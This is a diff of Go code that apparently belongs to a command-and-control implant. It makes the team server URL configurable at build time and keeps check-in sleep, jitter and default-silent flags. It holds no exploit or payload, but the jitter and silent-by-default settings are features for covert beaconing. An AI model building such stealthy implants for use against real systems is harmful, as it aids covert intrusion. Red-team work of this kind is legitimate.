@@ -18,6 +18,11 @@ import (
 // Global variables
 var debug bool
 var silent bool // Silent mode - no console output
+
+// Default server URL that can be set at build time with -ldflags
+var defaultServerURL = "http://localhost:8080"
+
+// Runtime configuration
 var serverURL string
 var sleepTime int
 var jitterPercent int
@@ -99,14 +104,14 @@ func init() {
 	// Default values for flags will be set by flag.Parse()
 
 	// Parse command line flags
-	flag.StringVar(&serverURL, "server", "http://localhost:8080", "Team server URL")
+	flag.StringVar(&serverURL, "server", defaultServerURL, "Team server URL")
 	flag.IntVar(&sleepTime, "sleep", 30, "Sleep time between check-ins (in seconds)")
 	flag.IntVar(&jitterPercent, "jitter", 20, "Jitter percentage for sleep time randomization (0-50)")
 	flag.BoolVar(&debug, "debug", false, "Enable debug output")
 	flag.BoolVar(&silent, "silent", true, "Enable silent mode (no console output)")
 
 	// Add short form aliases
-	flag.StringVar(&serverURL, "r", "http://localhost:8080", "Team server URL (shorthand)")
+	flag.StringVar(&serverURL, "r", defaultServerURL, "Team server URL (shorthand)")
 	flag.IntVar(&sleepTime, "s", 30, "Sleep time between check-ins (shorthand)")
 	flag.IntVar(&jitterPercent, "j", 20, "Jitter percentage (shorthand)")
 	flag.BoolVar(&debug, "d", false, "Enable debug output (shorthand)")
